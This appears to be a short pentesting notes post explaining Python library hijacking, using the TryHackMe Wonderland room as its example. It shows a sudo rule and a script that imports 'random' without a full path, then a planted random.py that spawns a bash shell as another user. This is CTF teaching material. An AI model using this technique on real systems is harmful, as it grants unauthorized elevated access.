---
description: >-
  Python Library Hijacking
title: Python Library Hijacking              # Add title here
date: 2022-08-04 08:00:00 -0600                           # Change the date to match completion date
categories: [04 Privilege Escalation, Python Library Hijacking]                     # Change Templates to Writeup
tags: [privesc, python library hijacking]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### Libraries hijacking
If there is a script using certain library without full path, you can hijack and impersonate commands as the user executing the script:

```bash
alice@wonderland:/root$ sudo -l
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

In this case the random library can be hijacked:
```python
--------------------- Code being executed -------------------------------
import random
poem = """The sun was shining on the sea,
Shining with all his might"""
```
The prior library is not using full path to being called so we can create a file called random.py as python will first look onto the same folder instead of the PATH variable environment:
```python
--------------------------- random.py ---------------------------------
import pty

pty.spawn("/bin/bash")
```
Examples: 
[THM Wonderland](https://tryhackme.com/room/wonderland)
